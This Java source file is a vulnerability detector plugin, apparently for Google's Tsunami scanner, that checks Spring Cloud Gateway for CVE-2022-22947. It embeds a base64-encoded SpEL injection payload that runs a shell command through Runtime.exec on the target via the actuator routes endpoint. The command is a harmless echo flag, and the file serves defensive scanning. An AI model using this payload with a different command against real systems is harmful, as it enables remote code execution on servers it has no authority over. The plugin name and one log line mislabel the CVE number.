/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202222947;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.ACCEPT;
import static com.google.common.net.HttpHeaders.ACCEPT_ENCODING;
import static com.google.common.net.HttpHeaders.ACCEPT_LANGUAGE;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.USER_AGENT;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.data.NetworkServiceUtils.buildWebApplicationRootUrl;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.MediaType;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Base64;
import java.util.UUID;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2022-22947 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE202122205VulnDetector",
    version = "0.1",
    description = Cve202222947VulnDetector.VULN_DESCRIPTION,
    author = "hh-hunter",
    bootstrapModule = Cve202222947DetectorBootstrapModule.class)
public final class Cve202222947VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String ROUTES = "actuator/gateway/routes/";
  private static final String REFRESH = "actuator/gateway/refresh";
  private static final String POST_DATA =
      "eyJpZCI6IlJPVVRFUl9UU1VOQU1JIiwiZmlsdGVycyI6W3sibmFtZSI6IkFkZFJlc3BvbnNlSGVhZGVyIiwiYXJncyI6"
          + "eyJuYW1lIjoiUmVzdWx0PSIsInZhbHVlIjoiI3tuZXcgU3RyaW5nKFQob3JnLnNwcmluZ2ZyYW1ld29yay51dG"
          + "lsLlN0cmVhbVV0aWxzKS5jb3B5VG9CeXRlQXJyYXkoVChqYXZhLmxhbmcuUnVudGltZSkuZ2V0UnVudGltZSgp"
          + "LmV4ZWMoXCJlY2hvIFRTVU5BTUlfVlVMTl9GTEFHXCIpLmdldElucHV0U3RyZWFtKCkpKX0ifX1dLCJ1cmkiOi"
          + "JodHRwOi8vdGVzdC5jb20ifQ==";

  @VisibleForTesting static final String CHECK_VULN_FLAG = "TSUNAMI_VULN_FLAG";
  private static final String TSUNAMI_SCANNER_USER_AGENT = "TSUNAMI_SCANNER";
  private static final String PLACEHOLDER = "ROUTER_TSUNAMI";

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "In spring cloud gateway versions prior to 3.1.1+ and 3.0.7+ , applications are vulnerable "
          + "to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and "
          + "unsecured. A remote attacker could make a maliciously crafted request that could allow"
          + " arbitrary remote execution on the remote host.";

  private final HttpClient httpClient;
  private final Clock utcClock;

  @Inject
  Cve202222947VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
  }

  private static boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return networkService.getServiceName().isEmpty()
        || NetworkServiceUtils.isWebService(networkService)
        || NetworkServiceUtils.getServiceName(networkService).equals("unknown")
        || NetworkServiceUtils.getServiceName(networkService).equals("rtsp");
  }

  private static StringBuilder buildTarget(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(buildWebApplicationRootUrl(networkService));
    } else {
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    return targetUrlBuilder;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2921-22205 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(Cve202222947VulnDetector::isWebServiceOrUnknownService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private String createRouter(NetworkService networkService) throws IOException {
    String router = UUID.randomUUID().toString().replace("-", "").substring(0, 6);
    String url = buildTarget(networkService).append(ROUTES).append(router).toString();
    String payload = new String(Base64.getDecoder().decode(POST_DATA)).replace(PLACEHOLDER, router);
    HttpResponse httpResponse =
        httpClient.send(
            post(url)
                .setHeaders(
                    HttpHeaders.builder()
                        .addHeader(CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
                        .addHeader(USER_AGENT, TSUNAMI_SCANNER_USER_AGENT)
                        .addHeader(ACCEPT_LANGUAGE, "en")
                        .addHeader(ACCEPT_ENCODING, "gzip, deflate")
                        .addHeader(ACCEPT, "*/*")
                        .build())
                .setRequestBody(ByteString.copyFromUtf8(payload))
                .build(),
            networkService);
    if (httpResponse.status().code() == HttpStatus.CREATED.code()) {
      return router;
    }
    return "";
  }

  private void refresh(String url, NetworkService networkService) throws IOException {
    httpClient.send(
        post(url)
            .setHeaders(
                HttpHeaders.builder()
                    .addHeader(CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
                    .addHeader(USER_AGENT, TSUNAMI_SCANNER_USER_AGENT)
                    .build())
            .build(),
        networkService);
  }

  private boolean requestRoute(String url, NetworkService networkService) throws IOException {
    HttpResponse httpResponse =
        httpClient.send(
            get(url)
                .setHeaders(
                    HttpHeaders.builder()
                        .addHeader(CONTENT_TYPE, MediaType.FORM_DATA.toString())
                        .addHeader(USER_AGENT, TSUNAMI_SCANNER_USER_AGENT)
                        .build())
                .build(),
            networkService);
    return httpResponse.status().code() == HttpStatus.OK.code()
        && httpResponse.bodyString().get().contains(CHECK_VULN_FLAG);
  }

  private void deleteRoutes(String url, NetworkService networkService) throws IOException {
    httpClient.send(
        HttpRequest.delete(url)
            .setHeaders(
                HttpHeaders.builder().addHeader(USER_AGENT, TSUNAMI_SCANNER_USER_AGENT).build())
            .build(),
        networkService);
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    try {
      String tmpRouter = createRouter(networkService);
      if (tmpRouter.isEmpty()) {
        return false;
      }
      refresh(buildTarget(networkService).append(REFRESH).toString(), networkService);
      boolean requestRouteStatus =
          requestRoute(
              buildTarget(networkService).append(ROUTES).append(tmpRouter).toString(),
              networkService);
      deleteRoutes(
          buildTarget(networkService).append(ROUTES).append(tmpRouter).toString(), networkService);
      refresh(buildTarget(networkService).append(REFRESH).toString(), networkService);
      return requestRouteStatus;
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2022_22947"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2022-22947 Spring Cloud Gateway Actuator API SpEL Code Injection")
                .setRecommendation(
                    "Users of affected versions should apply the following remediation. 3.1.x users"
                        + " should upgrade to 3.1.1+. 3.0.x users should upgrade to 3.0.7+. If the"
                        + " Gateway actuator endpoint is not needed it should be disabled via "
                        + "management.endpoint.gateway.enabled: false. If the actuator is required"
                        + " it should be secured using Spring Security, "
                        + "see https://docs.spring.io/spring-boot/docs/current/reference/html/"
                        + "actuator.html#actuator.endpoints.security.")
                .setDescription(VULN_DESCRIPTION))
        .build();
  }
}
